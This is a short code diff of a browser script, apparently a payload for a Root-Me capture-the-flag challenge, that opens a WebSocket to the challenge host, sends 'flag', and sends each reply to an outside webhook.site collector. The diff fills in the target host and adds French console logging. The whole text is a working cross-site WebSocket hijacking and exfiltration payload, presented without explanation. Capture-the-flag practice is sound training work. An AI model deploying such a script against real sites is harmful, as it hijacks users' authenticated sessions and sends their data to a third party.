@@ -1,9 +1,11 @@
 <script>
-  var ws = new WebSocket('ws://HOSTNAME/ws');
+  var ws = new WebSocket('ws://ctf14.root-me.org/ws');
   ws.onopen = function() {
+    console.log('Websock ouverte');
     ws.send('flag');
   };
   ws.onmessage = function(msg) {
     fetch('https://webhook.site/bea64db4-bc98-4939-b7dc-e68494139c39?r=' + encodeURIComponent(msg.data));
   };
+  ws.onerror = function(e) { console.log('Erreur:', e); };
 </script>
